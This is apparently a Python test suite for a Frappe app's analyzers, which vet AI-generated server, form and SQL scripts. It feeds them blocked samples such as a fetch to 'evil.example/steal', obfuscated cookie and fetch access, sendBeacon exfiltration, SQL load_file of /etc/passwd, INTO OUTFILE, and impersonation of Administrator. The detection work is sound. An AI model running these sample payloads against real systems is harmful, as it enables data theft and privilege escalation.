"""Case tables for the customization analyzers (docs/customization/01 §3.5, §4.1 group B).

The sources come from the evidence on acc.dev/ai.dev: ``import frappe``, top-level ``return {``,
``@frappe.whitelist()``, ``.format``, ``make_post_request``, ``ignore_permissions=True``; JS ``eval``,
``fetch("https://")``, ``document.cookie``; SQL ``UPDATE``, ``INTO OUTFILE``, ``SLEEP``, ``tab__Auth``,
``%(from_date)s`` without a filter. No database except for the permission checks.
"""

from unittest.mock import patch

import frappe
from frappe.tests import IntegrationTestCase

from ai_agent.customization.analyzers import js_code, python_code, sql


def codes(checks, level=None):
	return {c.code for c in checks if level is None or c.level == level}


def critical(checks):
	return codes(checks, "critical")


class TestPythonAnalyzer(IntegrationTestCase):
	BLOCKED = [
		("import frappe\ndoc.title = 'x'", "py.import"),
		("from frappe.utils import nowdate\nx = nowdate()", "py.import"),
		("x = 1\nreturn {'a': x}", "py.syntax"),
		("@frappe.whitelist()\ndef get_x():\n    return 1\n", "py.decorator"),
		("msg = 'a {0}'.format(doc.name)", "py.format"),
		("frappe.make_post_request('https://x.io', data={'a': 1})", "py.network"),
		("r = frappe.make_get_request('https://x.io')", "py.network"),
		("c = FrappeClient('https://x.io')", "py.network"),
		("frappe.sendmail(recipients=['a@b.c'], message='x')", "py.outbound"),
		("frappe.enqueue('x.y')", "py.outbound"),
		("frappe.call(m)", "py.call_dynamic"),
		("run_script('other')", "py.outbound"),
		("frappe.delete_doc('ToDo', doc.name)", "py.destructive"),
		("frappe.db.commit()", "py.transaction"),
		("d = frappe.get_doc('ToDo', 'x')\nd.save(ignore_permissions=True)", "py.ignore_permissions"),
		("d = frappe.get_doc('ToDo', 'x')\nd.flags.ignore_permissions = True\nd.save()", "py.ignore_permissions"),
		("d = frappe.get_doc({'doctype': 'ToDo', 'ignore_permissions': True})", "py.ignore_permissions"),
		("frappe.set_user('Administrator')", "py.identity"),
		("rows = frappe.db.sql('select name from tabToDo')", "py.identity"),
		("x = frappe.local.conf", "py.identity"),
		("frappe.session.user = 'Administrator'", "py.identity"),
		("u = frappe.get_doc('User', 'Administrator')", "py.protected_doctype"),
		("frappe.db.set_value('Server Script', 'x', 'disabled', 0)", "py.protected_doctype"),
		("s = frappe.get_all('AI Settings')", "py.protected_doctype"),
		("d = frappe.get_doc({'doctype': 'Has Role', 'role': 'System Manager'})", "py.protected_doctype"),
		("frappe.throw('<script>alert(1)</script>')", "py.html_message"),
		("f = getattr(frappe, 'sendmail')", "py.dynamic"),
		("x = doc._secret", "py.private"),
		("", "py.empty"),
	]

	def test_blocked_patterns(self):
		for src, code in self.BLOCKED:
			with self.subTest(src=src):
				self.assertIn(code, critical(python_code.analyze(src, "API" if "return" in src else "DocType Event")))

	def test_api_logic_inside_uncalled_def(self):
		src = "def get_generation_history():\n    return frappe.get_list('ToDo')\n"
		self.assertIn("py.api_def", critical(python_code.analyze(src, "API")))

	def test_called_helper_def_is_fine(self):
		src = "def count(rows):\n    return len(rows)\nfrappe.response['message'] = count(frappe.get_list('ToDo', fields=['name']))"
		self.assertNotIn("py.api_def", critical(python_code.analyze(src, "API")))

	def test_js_bypass_shapes_are_refused(self):
		form = 'frappe.ui.form.on("ToDo", {refresh(frm){ %s }});'
		for body in ('globalThis.fetch("https://example.com");', 'window["fe" + "tch"]("https://example.com");',
				"const f = fetch; f('https://example.com');", "({}).constructor.constructor('return 1')();",
				"const i = new Image(); i.src = 'https://example.com/x';", "const c = 'x'; setTimeout(c, 10);",
				"const x = document['coo' + 'kie'];", "frappe.call({method: 'frappe.client.' + 'delete'});",
				"self.open('https://example.com');"):
			checks = js_code.analyze(form % body, "Form", "ToDo")
			self.assertTrue(critical(checks), body)
		fine = js_code.analyze(form % "frm.set_value('status', 'Open'); setTimeout(() => frm.refresh(), 10);", "Form", "ToDo")
		self.assertFalse(critical(fine))

	def test_aliases_and_computed_doctypes_are_refused(self):
		for src, code in (
			("d = frappe.db\nd.commit()", "py.alias"),
			("f = frappe\nf.sendmail(recipients=['a@b.c'])", "py.alias"),
			("rows = frappe.get_list('Us' + 'er', fields=['name'])\nfrappe.response['message'] = rows", "py.dynamic_doctype"),
		):
			self.assertIn(code, critical(python_code.analyze(src, "API")), src)
		fine = python_code.analyze("x = frappe.db.get_value('ToDo', 'x', 'status')\nfrappe.response['message'] = x", "API")
		self.assertFalse(critical(fine))

	def test_a_report_may_not_write(self):
		src = "d = frappe.get_doc('ToDo', 'x')\nd.save()\ndata = [[], []]"
		self.assertIn("py.write", critical(python_code.analyze(src, "Script Report")))

	def test_frappe_apis_missing_from_the_sandbox(self):
		for call in ('frappe.get_cached_value("Company", "x", "abbr")', 'frappe.get_single("Selling Settings")', 'frappe.db.no_such_helper()'):
			checks = python_code.analyze(f"x = {call}\ndata = [[], []]", "Script Report")
			self.assertIn("py.not_available", critical(checks), call)
		ok = python_code.analyze('x = frappe.db.get_value("Company", "x", "abbr")\ndata = [[], []]', "Script Report")
		self.assertNotIn("py.not_available", critical(ok))

	def test_frappe_call_whitelisted_method(self):
		ok = python_code.analyze('r = frappe.call("frappe.desk.query_report.run", report_name="Trial Balance", filters={})\ndata = [[], []]', "Script Report")
		self.assertIn("py.call", [c.code for c in ok])
		self.assertFalse(critical(ok))
		self.assertIn("py.call_missing", critical(python_code.analyze('frappe.call("ai_agent.no_such.method")\ndata = [[], []]', "Script Report")))
		self.assertIn("py.call_dynamic", critical(python_code.analyze('frappe.call(m)\ndata = [[], []]', "Script Report")))
		writes = python_code.analyze('frappe.call("frappe.client.delete", doctype="ToDo", name="x")', "API")
		self.assertIn("py.write", [c.code for c in writes if c.level == "warning"])

	def test_sandbox_runtime_traps(self):
		"""Each compiles under RestrictedPython but fails inside safe_exec on Frappe v16."""
		for src, code in (
			("a, b = 1, 2", "py.unpack"),
			("x = frappe.utils.now_datetime().strftime('%Y')", "py.strftime"),
			("x = list(map(str, [1]))", "py.not_available"),
		):
			with self.subTest(src=src):
				self.assertIn(code, critical(python_code.analyze(src, "DocType Event", "ToDo")))
		ok = "for k, v in {'a': 1}.items():\n    pass\nnames = [r.name for r in frappe.get_list('ToDo', fields=['name'])]"
		self.assertFalse(critical(python_code.analyze(ok, "DocType Event", "ToDo")))

	def test_clean_event_script(self):
		src = 'if doc.priority == "High" and not doc.description:\n    frappe.throw(_("Describe high priority tasks"))\n'
		checks = python_code.analyze(src, "DocType Event", "ToDo")
		self.assertFalse(critical(checks))
		self.assertIn("py.syntax", codes(checks, "ok"))

	def test_unchecked_read_is_a_warning_in_api_info_in_event(self):
		src = 'frappe.response["message"] = frappe.get_all("Customer", fields=["name"])'
		self.assertIn("py.unchecked_read", codes(python_code.analyze(src, "API"), "warning"))
		src = 'n = frappe.db.get_value("Customer", doc.customer, "customer_name")'
		self.assertIn("py.unchecked_read", codes(python_code.analyze(src, "DocType Event", "ToDo"), "info"))

	def test_permission_check_clears_unchecked_read(self):
		"""doc.check_permission covers a loaded document; get_list applies permissions itself."""
		src = (
			'd = frappe.get_doc("Customer", frappe.form_dict.name)\nd.check_permission("read")\n'
			'frappe.response["message"] = [d.customer_name, frappe.get_list("Customer", fields=["name"])]'
		)
		self.assertNotIn("py.unchecked_read", codes(python_code.analyze(src, "API")))

	def test_has_permission_is_not_available_in_server_scripts(self):
		"""Frappe v16 safe_exec has no frappe.has_permission / get_roles: the script would fail at run time."""
		src = 'if frappe.has_permission("Customer", "read"):\n    frappe.response["message"] = frappe.get_roles()'
		self.assertIn("py.not_available", codes(python_code.analyze(src, "API")))

	def test_reads_of_own_doctype_are_fine(self):
		src = 'other = frappe.get_doc(doc.doctype, doc.name)\nx = frappe.db.get_value("ToDo", doc.name, "status")'
		self.assertNotIn("py.unchecked_read", codes(python_code.analyze(src, "DocType Event", "ToDo")))

	def test_writes_to_other_records_warn(self):
		src = 'd = frappe.get_doc("Note", "x")\nd.title = "y"\nd.save()'
		self.assertIn("py.write", codes(python_code.analyze(src, "DocType Event", "ToDo"), "warning"))

	def test_get_list_is_permission_checked(self):
		src = 'frappe.response["message"] = frappe.get_list("ToDo", fields=["name"], limit=5)'
		checks = python_code.analyze(src, "API")
		self.assertFalse(critical(checks))
		self.assertNotIn("py.unchecked_read", codes(checks))

	def test_while_true_without_break(self):
		self.assertIn("py.loop", codes(python_code.analyze("while True:\n    x = 1\n", "API"), "warning"))

	def test_response_in_event_and_doc_in_api(self):
		self.assertIn("py.response_in_event", codes(python_code.analyze('frappe.response["x"] = 1', "DocType Event")))
		self.assertIn("py.doc_in_api", codes(python_code.analyze('frappe.response["message"] = doc.name', "API")))


class TestJavaScriptAnalyzer(IntegrationTestCase):
	FORM = 'frappe.ui.form.on("ToDo", {\n  refresh(frm) {\n    %s\n  }\n});\n'
	BLOCKED = [
		('eval("1+1");', "js.dynamic_code"),
		('const f = new Function("return 1");', "js.dynamic_code"),
		('setTimeout("alert(1)", 10);', "js.dynamic_code"),
		('import("https://x.io/a.js");', "js.dynamic_code"),
		('fetch("https://evil.example/steal");', "js.network"),
		('fetch("/files/x");', "js.network"),
		('$.ajax({url: "https://x.io", data: frm.doc});', "js.network"),
		('navigator.sendBeacon("https://x.io", "a");', "js.network"),
		('new WebSocket("wss://x.io");', "js.network"),
		('const t = document.cookie;', "js.storage"),
		('localStorage.setItem("a", frm.doc.name);', "js.storage"),
		('console.log(frappe.csrf_token);', "js.storage"),
		('send(frappe.boot);', "js.storage"),
		('window.location.href = "https://evil.example";', "js.navigation"),
		('window.open(frm.doc.description);', "js.navigation"),
		('frm.set_value("a" ;', "js.syntax"),
	]

	def test_blocked_patterns(self):
		for body, code in self.BLOCKED:
			with self.subTest(body=body):
				self.assertIn(code, critical(js_code.analyze(self.FORM % body, "Form", "ToDo")))

	def test_clean_form_script(self):
		src = self.FORM % 'if (frm.doc.priority === "High") { frm.set_df_property("description", "reqd", 1); }\nconst n = frappe.boot.sysdefaults.currency;'
		checks = js_code.analyze(src, "Form", "ToDo")
		self.assertFalse(critical(checks), checks)
		self.assertIn("js.syntax", codes(checks, "ok"))

	def test_syntax_error_has_a_line(self):
		check = next(c for c in js_code.analyze(self.FORM % "let x = ;", "Form", "ToDo") if c.code == "js.syntax")
		self.assertEqual(check.line, 3)

	def test_form_must_target_its_doctype(self):
		src = 'frappe.ui.form.on("Sales Invoice", { refresh(frm) {} });'
		self.assertIn("js.form_target", critical(js_code.analyze(src, "Form", "ToDo")))
		self.assertIn("js.form_missing", critical(js_code.analyze("const a = 1;", "Form", "ToDo")))

	def test_list_settings(self):
		ok = 'frappe.listview_settings["ToDo"] = { add_fields: ["status"] };'
		self.assertFalse(critical(js_code.analyze(ok, "List", "ToDo")))
		self.assertIn("js.list_missing", critical(js_code.analyze('frappe.listview_settings["Note"] = {};', "List", "ToDo")))

	def test_html_injection_warns(self):
		checks = js_code.analyze(self.FORM % 'frm.fields_dict.description.$wrapper[0].innerHTML = frm.doc.description;', "Form", "ToDo")
		self.assertIn("js.html_injection", codes(checks, "warning"))

	def test_frappe_call_methods(self):
		src = self.FORM % 'frappe.call({method: "frappe.client.delete", args: {}});\nfrappe.xcall("ai_agent.no_such.method");\nfrappe.call("frappe.client.get_count", {doctype: "ToDo"});'
		checks = js_code.analyze(src, "Form", "ToDo")
		self.assertIn("js.call_write", codes(checks, "warning"))
		self.assertIn("js.call_missing", codes(checks, "critical"))
		self.assertIn("js.call", codes(checks, "info"))

	def test_missing_node_fails_closed(self):
		with patch.dict(frappe.conf, {"node_path": "/nonexistent/node"}):
			checks = js_code.analyze(self.FORM % "frm.refresh();", "Form", "ToDo")
		self.assertIn("js.unavailable", critical(checks))


class TestSqlAnalyzer(IntegrationTestCase):
	def setUp(self):
		frappe.set_user("Administrator")

	def analyze(self, query, filters=None, roles=None):
		return sql.analyze(query, filters or [], "Administrator", roles)[0]

	BLOCKED = [
		("update `tabToDo` set status = 'Closed'", "sql.read_only"),
		("delete from `tabToDo`", "sql.read_only"),
		("select name from `tabToDo` into outfile '/tmp/x'", "sql.into"),
		("select sleep(5)", "sql.function"),
		("select benchmark(1000000, md5('a'))", "sql.function"),
		("select load_file('/etc/passwd')", "sql.function"),
		("select * from `__Auth`", "sql.table_blocked"),
		("select * from tab__Auth", "sql.table_missing"),
		("select * from `tabSessions`", "sql.table_blocked"),
		("select * from mysql.user", "sql.table_system"),
		("select 1; select 2", "sql.statements"),
		("select name from `tabToDo` for update", "sql.lock"),
		("select name from `tabNo Such DocType`", "sql.table_missing"),
		("select name from `tabSalary Slip`", "sql.table_blocked"),
		("select name from `tabServer Script`", "sql.table_blocked"),
		("select name from `tabToDo` where description like '%x%'", "sql.percent"),
		("with d as (delete from `tabToDo` returning name) select * from d", "sql.read_only"),
	]

	def test_blocked_queries(self):
		for query, code in self.BLOCKED:
			with self.subTest(query=query):
				self.assertIn(code, critical(self.analyze(query)))

	def test_placeholder_without_filter(self):
		query = "select name from `tabToDo` where date >= %(from_date)s"
		self.assertIn("sql.placeholder_missing", critical(self.analyze(query)))
		filters = [{"fieldname": "from_date", "label": "From", "fieldtype": "Date", "mandatory": 1}]
		self.assertNotIn("sql.placeholder_missing", critical(self.analyze(query, filters)))

	def test_unused_filter_warns(self):
		filters = [{"fieldname": "status", "label": "Status", "fieldtype": "Data"}]
		self.assertIn("sql.filter_unused", codes(self.analyze("select name from `tabToDo`", filters), "warning"))

	def test_valid_join_and_tables(self):
		query = ("select t.name, n.title from `tabToDo` t join `tabNote` n on n.name = t.reference_name "
			"where t.status = %(status)s and t.description like %(pattern)s")
		filters = [{"fieldname": "status", "label": "S", "fieldtype": "Data", "mandatory": 1},
			{"fieldname": "pattern", "label": "P", "fieldtype": "Data", "default": "%%"}]
		checks, tables = sql.analyze(query, filters, "Administrator", None)
		self.assertFalse(critical(checks), checks)
		self.assertEqual(sorted(tables), ["Note", "ToDo"])

	def test_single_table_suggests_report_builder(self):
		self.assertIn("sql.builder_possible", codes(self.analyze("select name, status from `tabToDo` where status='Open'"), "info"))

	def test_requester_without_read_permission(self):
		user = "ai-customize-guestish@example.com"
		if not frappe.db.exists("User", user):
			frappe.get_doc({"doctype": "User", "email": user, "first_name": "No Read", "send_welcome_email": 0,
				"user_type": "Website User"}).insert(ignore_permissions=True)
		checks, _tables = sql.analyze("select name from `tabNote`", [], user, None)
		self.assertIn("sql.table_permission", critical(checks))

	def test_role_widening_warns(self):
		role = "ai_customize_no_read_role"
		if not frappe.db.exists("Role", role):
			frappe.get_doc({"doctype": "Role", "role_name": role, "desk_access": 1}).insert(ignore_permissions=True)
		checks = self.analyze("select name from `tabToDo`", roles=[role])
		self.assertIn("sql.role_widening", codes(checks, "warning"))

	def test_preview_runs_and_limits(self):
		out = sql.preview("select name, status from `tabToDo`", {}, "ToDo")
		self.assertEqual(out["columns"], ["name", "status"])
		self.assertLessEqual(len(out["rows"]), sql.PREVIEW_ROWS)

	def test_sample_values(self):
		filters = [{"fieldname": "from_date", "fieldtype": "Date"}, {"fieldname": "to_date", "fieldtype": "Date"},
			{"fieldname": "status", "fieldtype": "Data", "default": "Open"}]
		values = sql.sample_values(filters, {"status": "Closed"})
		self.assertEqual(values["status"], "Closed")
		self.assertLessEqual(values["from_date"], values["to_date"])
